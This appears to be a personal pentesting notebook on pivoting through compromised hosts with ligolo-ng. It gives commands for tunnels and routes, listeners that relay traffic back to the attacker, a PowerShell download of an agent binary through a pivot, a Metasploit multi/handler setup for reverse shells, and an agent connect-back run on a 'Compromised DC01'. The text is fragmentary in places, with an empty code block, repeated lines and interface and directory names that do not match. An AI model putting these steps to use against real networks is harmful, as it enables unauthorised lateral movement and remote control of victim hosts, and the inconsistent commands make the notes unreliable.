https://github.com/nicocha30/ligolo-ng/releases/tag/v0.8.2
start server and agent
select session
do ifconfig and notice the new internal interface
add new route
example
https://excalidraw.com/

![](/images/Pasted image 20250705163258.png)
```
agent connect
```
![](/images/Pasted image 20250705164031.png)
add route to internal network
```
sudo ip route add 10.10.8.0/24 dev ligolo 
```

	KALI ->HOST1
	
add  a new host to tunnel
`create interface`
```
sudo tuntap  add user kali  mode tun  ligolo-double 
sudo ip link set ligolo-pivot1 up
```

add listener on pivot1 to forward traffic to attacker
`forward incoming 11601 to my connected 11601 (attker)`
```
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp 
```

`jumphost2 connec to jumphost1`
```
ligolo-agent.exe -connect 10.10.8.9:11601 -ignore-cert
```

select the session
![](/images/Pasted image 20250705165151.png)
check  the new  NIC
```
ifconfig
```
start the tunnel
```
tunnel start --tun ligolo-double
```
add a route to the third network to make it via the ligolo-double IF
```
sudo ip route add 172.16.3.0/24 dev ligolo-double
```

with session of pivot2 host start the tunnel
```
[Agent PIVOT-SRV02 ]tunnel_start --tun ligolo-double
```

if u get an error run this
```
sudo ip link delete ligolo-double
```

check listeners
```
listener_list
```

# File Transfers

```
[Agent : ubuntu@darkside] » listener_add --addr 0.0.0.0:2000 --to 0.0.0.0:31337

┌──(kali㉿kali)-[/opt/ligolo/windows]
└─$ python3 -m http.server 31337
Serving HTTP on 0.0.0.0 port 31337 (http://0.0.0.0:31337/) ...
```

```
iwr -uri http://pivot1IP:2000/agent.exe -Outfile C:\Users\Public\agent.exe
```
![](/images/Pasted image 20250705170217.png)

### Reverse Shells and meterpreter
![](/images/Pasted image 20250705170536.png)
```
LIGOLO pivot1@ubuntu>$ listener_add -addr 0.0.0.0:1111 --to 0.0.0.0:4444
```

```
msfconsole -q 
use multi/handler

set lport 4444 
set lhost 0.0.0.0
```

` on Compromised DC01`
```
C:\>    .\agent.exe -connect 10.10.8.9:1111 -ignore-cert
```
![](/images/Pasted image 20250705171025.png)
## Moving files, catching reverse shell

moving files or catching reverse shells require setting up listeners on different ports and port forwarding the traffic for each use case
ligolo keeps a list of redirections 
```
listener_list
```
![](/images/Pasted image 20250705171833.png)
# verify connection 

`test if pivot works with nmap`
if its working you get open 
if its not nmap shows filtered 

## Multiple pivots
![](/images/Pasted image 20250705163258.png)
`connect to pivot1 from pivot2`
```

```

`test if pivot works with nmap`
if its working you get open 
if its not nmap shows filtered 

`add nic for a newer pivot host`

` add a route to new network via new host`


# a fix  for certificate not found

 You can generate a TLS certificate for Ligolo manually using `openssl`. This is useful when:

 Generate TLS Certificate for Ligolo
`mkdir cers`
`cd certs`
```
openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 365 \
-subj "/CN=ligolo"
```

```
$ sudo ./proxy -laddr 0.0.0.0:11601 -certfile certs/cert.pem -keyfile certs/key.pem
              
```


```
create interface
ip tuntap
run proxy
connect to proxy from agent
add route with sudo ip route add ip/cidr <ligolo>
172.16.5.0      0.0.0.0         255.255.255.0   U     0      0        0 ligolo

```